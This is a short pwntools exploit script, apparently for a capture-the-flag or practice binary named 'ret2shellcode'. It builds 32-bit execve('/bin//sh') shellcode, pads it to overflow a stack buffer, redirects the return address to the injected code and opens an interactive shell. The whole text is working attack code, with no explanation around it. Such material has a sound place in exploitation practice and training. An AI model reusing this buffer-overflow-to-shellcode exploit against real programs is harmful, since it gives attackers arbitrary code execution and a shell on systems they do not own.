from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

p = process("./ret2shellcode")
if args.G:
    gdb.attach(p)

p.recvuntil("No system for you this time !!!")
shellcode = asm("xor ecx,ecx;xor ebx,ebx;xor eax,eax;mov al,0xb;push ecx;push 0x68732f2f;push 0x6e69622f;mov ebx,esp;int 0x80;")
p.sendline(shellcode.ljust(112, b'a') + p32(0x804a080))
p.interactive()
